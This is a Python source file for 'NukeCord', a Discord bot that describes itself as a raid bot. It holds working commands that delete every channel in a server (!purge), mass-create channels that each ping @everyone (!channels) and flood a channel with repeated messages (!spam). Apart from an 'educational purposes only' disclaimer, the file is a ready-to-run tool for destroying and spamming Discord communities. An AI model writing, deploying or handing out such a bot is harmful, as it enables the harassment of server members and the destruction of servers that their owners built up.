import discord
from discord.ext import commands

bot = commands.Bot(command_prefix="!", description="Raid bot")
bot.remove_command("help")


@bot.event
async def on_ready():
    print("""
███╗   ██╗██╗   ██╗██╗  ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██║     ██║   ██║██████╔╝██║  ██║    
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██║     ██║   ██║██╔══██╗██║  ██║    
██║ ╚████║╚██████╔╝██║  ██╗███████╗╚██████╗╚██████╔╝██║  ██║██████╔╝    
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     
Nukecord 2024 - All rights reserved.

Creator : @SaumonArcEnCiel
Contact me : talk@saumon.me

This content is provided for educational purposes only.
_______________________________________________________
""")


@bot.command()
async def help(ctx):
    embed = discord.Embed(
title="NukeCord | Commands available :",
description="""
**Raid commands**
`!channels [number] [name]` : Creates the requested number of channels.
`!purge` : Delete all channels from the server.
`!spam [message] [number]` : Send the requested message X times.

**Bot commands**
`!help`: Send the list of commands
`!infos` : Send some usefull informations (source code, disclaimer..)
""",
color=0x2004AC)
    await ctx.send(embed=embed)

@bot.command()
async def infos(ctx):
    embed = discord.Embed(
name="NukeCord | Informations",
description="""
NukeCord is the best free, self-hosted and open source raid bot for Discord. It is only distributed for educational purposes, we do not encourage the destruction of Discord servers and remind you to respect the Discord Guidelines.
You can find the source code here : https://github.com/saumonarcenciel/nukecord. 
""",
color=0x2004AC)
    await ctx.send(embed=embed)

@bot.command()
async def channels(ctx, num_channels=30, reason="default"):
    await ctx.message.delete()
    guild = ctx.guild
    for i in range(num_channels):
        new_channel = await guild.create_text_channel(reason)
        await new_channel.send("@everyone")

    await ctx.send(f"✅ **| {num_channels} successfully created text channels.**")
    print(f"[+] {num_channels} successfully created text channels.")

   
@bot.command()
async def purge(ctx):
    await ctx.send("Starting purge...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

    new_channel = await ctx.guild.create_text_channel("nuked")
    await new_channel.send("✅ **| Purge ended.**")
    print("[+] Purge ended.")

@bot.command()
async def spam(ctx, message, num_times=5):
    await ctx.message.delete()
    for i in range(num_times):
        await ctx.send(message)



bot.run("token")
